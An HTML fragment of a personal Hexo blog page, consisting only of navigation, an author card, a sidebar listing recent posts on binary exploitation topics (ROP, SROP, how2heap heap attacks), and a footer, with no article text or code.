class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/06/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-3%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%982/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">PWN入门（1-3-6-3）-基本ROP-ret2libc实战2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用mprotect修改程序段权限为可执行"/></a><div class="content"><a class="title" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行">利用mprotect修改程序段权限为可执行</a><time datetime="2021-06-10T07:59:46.000Z" title="Created 2021-06-10 15:59:46">2021-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP（1）--从两道题重新认识SROP attack"/></a><div class="content"><a class="title" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack">SROP（1）--从两道题重新认识SROP attack</a><time datetime="2021-05-31T02:14:53.000Z" title="Created 2021-05-31 10:14:53">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(14)-unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack">how2heap(14)-unsortedbin attack</a><time datetime="2021-05-18T07:48:53.000Z" title="Created 2021-05-18 15:48:53">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(13)-tcache_stashing_unlink_attack"/></a><div class="content"><a class="title" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack">how2heap(13)-tcache_stashing_unlink_attack</a><time datetime="2021-05-17T02:16:40.000Z" title="Created 2021-05-17 10:16:40">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(12)-house of lore"/></a><div class="content"><a class="title" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore">how2heap(12)-house of lore</a><time datetime="2021-05-14T08:02:54.000Z" title="Created 2021-05-14 16:02:54">2021-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>